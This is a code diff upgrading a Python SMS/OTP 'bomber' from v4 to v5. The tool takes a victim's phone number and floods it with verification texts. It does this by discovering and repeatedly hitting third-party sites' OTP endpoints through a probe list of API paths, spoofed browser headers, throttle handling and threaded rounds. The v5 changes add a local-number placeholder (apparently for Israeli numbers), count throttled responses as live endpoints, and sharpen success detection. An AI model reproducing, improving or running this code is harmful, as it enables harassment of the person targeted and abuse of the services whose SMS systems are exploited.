@@ -1,26 +1,22 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-OTP BOMBER v4
+OTP BOMBER v5
 =============
 Enter phone number -> enter rounds -> done.
 
-New in v4:
-  * PROBE_PATHS expanded to 36 paths (added the whole /v1/ and /v2/ family)
-  * PROBE_LIMIT raised so the whole list is really used
-  * per-endpoint cooldown + 429 back-off -> far fewer throttles, far more real SMS
-
-Kept from v3:
-  * browser-like headers (Origin / Referer) -> fewer 403
-  * strict verdict: an HTML "200" no longer counts as success
-  * phone is ALWAYS sent in international format
-  * remembers working endpoints in alive.json
+New in v5:
+  * verdict() honest: HTML page is not an API (kills catch-all false positives)
+  * 429 is "throttled" and retried, not counted as success
+  * captcha detected
+  * {phone_local} placeholder -> sends 0501234567 for sites that want local format
+  * per-endpoint cooldown (COOLDOWN)
 
 sites.txt line format:
     https://site.com/api/send-otp|POST|{"phone":"{phone}"}
-    https://site.com/api/otp?mobile={phone}|GET|
-    https://site.com/api/auth/otp                (payload defaults to JSON)
-    site.com|/api/auth/otp                       (tool hunts the rest)
+    https://site.com/customer/ajax/post/|POST|telephone={phone_local}
+    site.com|/api/auth/otp            (tool hunts the rest)
+    domain.com                        (tool hunts everything)
 """
 
 import json
@@ -41,8 +37,8 @@ ROUND_SECONDS = 30
 TIMEOUT       = 10
 COUNTRY_CODE  = "972"
 PROBE_LIMIT   = 40      # must be >= len(PROBE_PATHS)
-LOCAL_PHONE   = ""      # ממולא אוטומטית בזמן ריצה
 COOLDOWN      = 1.0     # seconds between two requests to the SAME endpoint
+LOCAL_PHONE   = ""      # filled at runtime, e.g. 0501234567
 
 UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36")
@@ -63,24 +59,22 @@ PROBE_PATHS = [
     "/api/v1/auth/otp", "/api/v1/send-otp", "/api/v1/auth/send-otp",
     "/api/v2/auth/otp", "/auth/send-otp", "/auth/otp", "/send-otp",
     "/otp/send", "/api/send-code", "/api/user/send-otp",
-    # --- v1 family ---
     "/api/v1/otp/send", "/api/v1/sms/send", "/api/v1/user/send-otp",
     "/api/v1/phone/send-code", "/api/v1/auth/sms", "/api/v1/auth/send-code",
     "/api/v1/user/otp", "/api/v1/verify/send",
-    # --- v2 family ---
     "/api/v2/otp/send", "/api/v2/auth/sms", "/api/v2/sms/send",
     "/api/v2/send-otp", "/api/v2/user/send-otp",
-    # --- without the /api prefix ---
     "/user/send-otp", "/auth/phone/send", "/auth/sms", "/sms/send",
     "/api/sms/send", "/api/auth/sms", "/api/auth/send-code",
     "/api/user/send-code", "/api/phone/send-code", "/api/verify/send",
 ]
 
 BAD_WORDS = ('"error"', '"success":false', '"status":false', '"ok":false',
-             '"valid":false', "invalid", "required", "not found", "expired",
-             "too many")
+             '"valid":false', '"result":false', "invalid", "required",
+             "not found", "expired", "too many", "not exist", "missing",
+             "unknown", "unrecognized")
 OTP_WORDS = ("otp", "verification code", "one time", "one-time",
-             "send sms", "sent", "verification", "code")
+             "send sms", "sent", "verification")
 
 
 # ----------------- helpers -----------------
@@ -115,7 +109,7 @@ def headers_for(url):
     return {
         "User-Agent": UA,
         "Accept": "application/json, text/plain, */*",
-        "Accept-Language": "en-US,en;q=0.9,he;q=0.8",
+        "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
         "Origin": base,
         "Referer": base + "/",
         "sec-ch-ua-mobile": "?1",
@@ -159,7 +153,7 @@ def parse_line(line):
     for u in urls:
         out.append({
             "url": u,
-            "method": method or ("GET" if "{phone}" in u else "POST"),
+            "method": method or ("GET" if "{phone" in u else "POST"),
             "payload": payload or '{"phone":"{phone}"}',
         })
     return out
@@ -180,36 +174,40 @@ def load_sites():
 
 # ----------------- the actual request -----------------
 def fire(ep, phone):
-    url = ep["url"].replace("{phone}", quote(phone, safe=""))
+    local = LOCAL_PHONE or phone
+    url = (ep["url"].replace("{phone_local}", local)
+                    .replace("{phone}", quote(phone, safe="")))
+    payload = (ep.get("payload") or "")
+    payload = payload.replace("{phone_local}", local).replace("{phone}", phone)
     h = headers_for(ep["url"])
-    payload = ep.get("payload") or ""
     method = ep.get("method", "POST").upper()
     try:
         if method == "GET":
             return sess().get(url, headers=h, timeout=TIMEOUT)
         if payload.strip().startswith("{"):
             h["Content-Type"] = "application/json"
-            body = payload.replace("{phone}", phone)
-            return sess().post(url, data=body.encode(), headers=h, timeout=TIMEOUT)
+            return sess().post(url, data=payload.encode(), headers=h,
+                               timeout=TIMEOUT)
         if "=" in payload:
             h["Content-Type"] = "application/x-www-form-urlencoded"
-            return sess().post(url, data=payload.replace("{phone}", phone),
-                               headers=h, timeout=TIMEOUT)
+            return sess().post(url, data=payload, headers=h, timeout=TIMEOUT)
         h["Content-Type"] = "application/json"
-        return sess().post(url, json={"phone": phone}, headers=h, timeout=TIMEOUT)
+        return sess().post(url, json={"phone": phone}, headers=h,
+                           timeout=TIMEOUT)
     except Exception:
         return None
 
 
 def verdict(r):
-    """live = באמת שלח | maybe = הנתיב קיים | dead = כלום"""
+    """live = really sent | maybe = endpoint exists | dead = nothing there"""
     if r is None:
         return "dead"
     c = r.status_code
     if c in (404, 405, 410):
         return "dead"
+
     ct = (r.headers.get("content-type") or "").lower()
-    body = (r.text or "")
+    body = r.text or ""
     low = body.lower()
 
     if c == 429:
@@ -221,12 +219,15 @@ def verdict(r):
     if not (200 <= c < 300):
         return "dead"
 
-    # דף HTML גדול = דף הבית. כמעט תמיד לא API אמיתי.
-    if "html" in ct and len(body) > 1500:
-        return "dead"
+    # big HTML page = the site's homepage / SPA catch-all
+    if "html" in ct:
+        if len(body) > 1500:
+            return "dead"
+        return "maybe" if any(w in low for w in OTP_WORDS) else "dead"
 
     if "json" in ct:
         return "maybe" if any(b in low for b in BAD_WORDS) else "live"
+
     if any(w in low for w in OTP_WORDS):
         return "live"
     return "maybe"
@@ -246,9 +247,9 @@ def discover(entries):
             for attempt in range(3):
                 v = verdict(fire(ep, ph))
                 if v == "throttled" and attempt < 2:
-                    time.sleep(3)
+                    time.sleep(2.5)
                     continue
-                if v == "live":
+                if v in ("live", "throttled"):
                     return ("LIVE", ep, ph)
                 if v == "maybe":
                     near.append((ep, ph))
@@ -263,7 +264,7 @@ def discover(entries):
             if kind == "LIVE":
                 alive.append({**ep, "phone": ph})
                 print(f"  + {ep['url']}")
-            if done % 25 == 0:
+            if done % 50 == 0:
                 print(f"    ... {done}/{total}  ({time.time() - t0:.0f}s)")
 
     print(f"\n[*] LIVE: {len(alive)}   |   near-miss: {len(near)}   "
@@ -279,7 +280,7 @@ def run_round(endpoints, budget):
     deadline = time.time() + budget
     st = {"sent": 0, "ok": 0, "thr": 0, "fail": 0}
     n = len(endpoints)
-    nxt = [0.0] * n            # earliest time each endpoint may be hit again
+    nxt = [0.0] * n
     idx = 0
     ex = ThreadPoolExecutor(max_workers=WORKERS)
     pending = {}
@@ -296,7 +297,8 @@ def run_round(endpoints, budget):
                     if nxt[i] <= now:
                         nxt[i] = now + COOLDOWN
                         e = endpoints[i]
-                        pending[ex.submit(fire, e, e.get("phone", PHONES[0]))] = i
+                        pending[ex.submit(fire, e,
+                                          e.get("phone", PHONES[0]))] = i
                         picked = True
                         break
                 if not picked:
@@ -343,7 +345,7 @@ def run_round(endpoints, budget):
 
 def main():
     print("=" * 56)
-    print("               O T P   B O M B E R   v4")
+    print("               O T P   B O M B E R   v5")
     print("=" * 56)
 
     if not os.path.exists(SITES_FILE):
@@ -354,9 +356,10 @@ def main():
     raw = input("\nEnter phone number: ").strip()
     if not raw:
         return
-    global PHONES
+    global PHONES, LOCAL_PHONE
     PHONES = norm_phones(raw)
-    print(f"    -> will send as: {PHONES[0]}")
+    LOCAL_PHONE = "0" + PHONES[0][len(COUNTRY_CODE):]
+    print(f"    -> will send as: {PHONES[0]}   (local: {LOCAL_PHONE})")
 
     try:
         rounds = max(1, int(input("How many rounds: ").strip() or "1"))
